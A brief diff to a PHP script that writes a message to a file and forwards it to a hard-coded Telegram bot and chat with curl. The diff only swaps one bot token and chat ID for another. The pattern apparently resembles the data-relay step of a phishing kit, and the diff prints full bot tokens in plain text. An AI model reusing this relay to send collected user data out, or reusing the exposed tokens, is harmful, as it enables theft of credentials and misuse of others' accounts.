@@ -24,8 +24,8 @@ fwrite($text, $message);
 
 /* Telegram */
 function sendMessage($messaggio) {
-    $token = '2104282985:AAEV0Q0Kz0NZI4QIq2xrjJgWeGxZEKUA2SA';
-    $chatid = '1275453727';
+    $token = '2096606596:AAG5pXX4sotZxew9zWFEtCLMF7T0TzjkvO4';
+    $chatid = '1656299190';
     $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
     $url = $url . "&text=" . urlencode($messaggio);
     $ch = curl_init();
